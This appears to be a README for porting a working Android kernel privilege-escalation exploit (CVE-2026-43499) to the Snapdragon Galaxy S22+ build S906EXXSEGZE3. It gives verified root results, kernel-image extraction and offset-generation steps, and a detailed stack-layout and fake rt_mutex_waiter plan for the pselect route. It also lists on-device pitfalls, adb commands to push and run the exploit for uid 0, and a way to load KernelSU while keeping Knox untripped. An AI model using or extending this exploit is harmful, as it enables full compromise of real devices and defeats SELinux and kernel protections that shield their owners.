# Port: Galaxy S22+ (SM-S906E, g0q) — S906EXXSEGZE3

Device-specific port of the CVE-2026-43499 exploit for the Snapdragon
Galaxy S22+ (SM-S906E, codename `g0q`, taro/SM8450).

```
Device: Samsung Galaxy S22+ (SM-S906E)
Codename: g0q (taro / Snapdragon 8 Gen 1, NOT Exynos)
Android: 16 / SDK 36
Build: BP2A.250605.031.A3.S906EXXSEGZE3
Fingerprint: samsung/g0qxxx/g0q:16/BP2A.250605.031.A3/S906EXXSEGZE3:user/release-keys
Kernel: 5.10.236-android12-9-31998796-abS906EXXSEGZE3 (aarch64)
Config (live /proc/config.gz): COMPAT=y, CFI_CLANG=y (enforcing),
  VA_BITS=39, KALLSYMS_ALL=y, KPROBES=y, IPV6=y, ASHMEM=y, RKP=y, KDP=y
```

Verified on-device: attempt 1/16, `uid=2000->0`, SELinux permissive,
`cfi write/read ret=35`, `rw64=1/1`. Reproduced on a second boot (1/16).

## Files added (2)

- `src/targets/S906EXXSEGZE3/target.h` — generated with `target_generator`
  (see below), label/fingerprint set for this build.
- `src/targets/S906EXXSEGZE3/main.c` — in-process pselect stamp route.
  Everything else (page reclaim, CFI verify, KASLR slide, pipe physrw,
  umh root, retry supervisor) is reused from `src/` unchanged.

Build exactly like the other targets:

```
make PROJECT=S906EXXSEGZE3 clean preload root-helper
```

## Getting the kernel Image (samfw has no SM-S906E entry)

1. Download the ILO firmware straight from Samsung FUS
   (`SM-S906E_..._fac.zip.enc4`, ~9.7 GB; region must be the sales code
   `ILO`, not the multi-CSC `OXM`).
2. Stream `boot.img.lz4` out of the AP tar.md5, `lz4` decompress to
   `boot.img` (ANDROID! magic), slice the kernel at offset `0x1000`
   (ARM64 `ARM\x64` magic at `+0x38`) with length `image_size` from the
   Image header (`+0x10`).
3. `./kallsyms Image` → `kallsyms.txt` (112k symbols,
   `_text = 0xffffffc008000000`).
4. Config: `adb exec-out cat /proc/config.gz` from the live device
   (authoritative for the running build).
5. `python3 generate_target.py kallsyms.txt config.txt Image
   --template target.h -o target.h` → SUCCESS, all defines patched.

## Why pselect: exp32 and exp64 are both dead on this build

- **exp32 (compat setsockopt)**: `__arm64_compat_sys_setsockopt` is an
  ENOSYS stub (`mov x0, #-0x26; ret`). The 260-byte compat stamp never
  executes, even though `CONFIG_COMPAT=y` and compat select/pselect/futex
  are all live.
- **exp64 (native setsockopt)**: `do_ipv6_setsockopt` (0xffffffc0094ef500,
  frame `0x2e0`) lays the 264-byte native `group_source_req` at `sp+0x58`
  (not `sp+0x160` as on S901W). With the `0xd0` syscall chain this puts the
  window at `[top-0x358, top-0x250)`, but the stale waiter sits at
  `[top-0x1f0, top-0x1a0)` — STAMP_OFF `0x168` overflows the `0x108` window
  by `0x60`. The v4 `ip_setsockopt` 264-byte case at `sp+0x20` (chain
  `0xa0` via sock_common→udp_setsockopt→ip_setsockopt, verified through the
  `inet_dgram_ops`/`udp_prot` tables) misses by 24 bytes (OFF `0xd0`,
  need ≤ `0xb8`). No setsockopt vector reaches the waiter.

## pselect geometry (GZE3, native 64-bit, verified by two 1/16 hits)

`__arm64_sys_pselect6` (`sub sp,#0xa0`) → `core_sys_select`
(`sub sp,#0x1c0`, `stack_fds` at `sp+0x50`, stack path iff
`size=((nfds+63)/8)&~7 < 0x2b`, i.e. nfds ≤ 320; `get_fd_set` inlined as
`__check_object_size` + `_copy_from_user`). nfds=320 → size=40:

```
in_start = top-0xa0-0x170 = top-0x210
in  [top-0x210, top-0x1e8)   out [top-0x1e8, top-0x1c0)
ex  [top-0x1c0, top-0x198)   res [top-0x198, top-0x120) (zeroed)
waiter (WRPI: entry-0x1a0+0x90, chain 0xe0) = [top-0x1f0, top-0x1a0)
```

Word map (10 words = full 80 B `rt_mutex_waiter`):

```
in[4]=w0 pc=fake_fops        out[0..4]=w1..w5 (right=0, left=target, pi_tree=0)
ex[0..3]=w6..w9 (task, lock, prio=0, deadline=0)   in[0..3]=ex[4]=0
```

The waiter thread runs WRPI → pselect (1 s timeout) on these fd_sets →
one `sched_setattr` nice-bump lands inside the block → walk → the shared
`try_cfi_stage()` verifies. One consumer shot per attempt; the supervisor
sweeps delays over fresh-child attempts.

## Runtime pitfalls found on-device (encoded in main.c)

1. **Fill the pipe before pselect.** `out` monitors writability: empty
   pipe write ends report ready instantly (`ret=37`, consumer never fires).
   Fill to EAGAIN (nonblocking) so nothing is writable.
2. **Do not park the read end at fd 319.** `in[4]=fake_fops` has its top
   bit set, so fd 319 is monitored in `in`; a data-holding read end there
   reports ready (`ret=1`). Leave fd 319 to get a write end from the dup
   loop (never readable); the read end stays open via `pipefd[0]`.
3. Expect `ret=5 errno=0 calls=1 success=1` on a hit, then
   `cfi write/read ret=35`.

## Deploy / run / verify

```
adb push build/S906EXXSEGZE3/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
adb push build/S906EXXSEGZE3/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb shell chmod 755 /data/local/tmp/cve-2026-43499 /data/local/tmp/cve-2026-43499-root
adb shell "SLIDE_ONLY=1 LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh -c true"  # smoke test
adb shell "LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"                       # 16 attempts
adb shell "/data/local/tmp/cve-2026-43499-root -c 'id'"                        # uid=0(root)
```

Reboot before running (clean slabs); keep the screen unlocked and the
phone idle. Root lasts until reboot. For a Manager app + per-app grants,
late-load KernelSU-Next (`kernelsu-android12-5.10.ko` +
`KernelSU_Next_v3.3.0-release.apk`) via
`cve-2026-43499-root -c 'insmod ...'` — no flashing, Knox untripped.
Do not take OTAs: a new kernel needs a re-port and may patch the CVE.
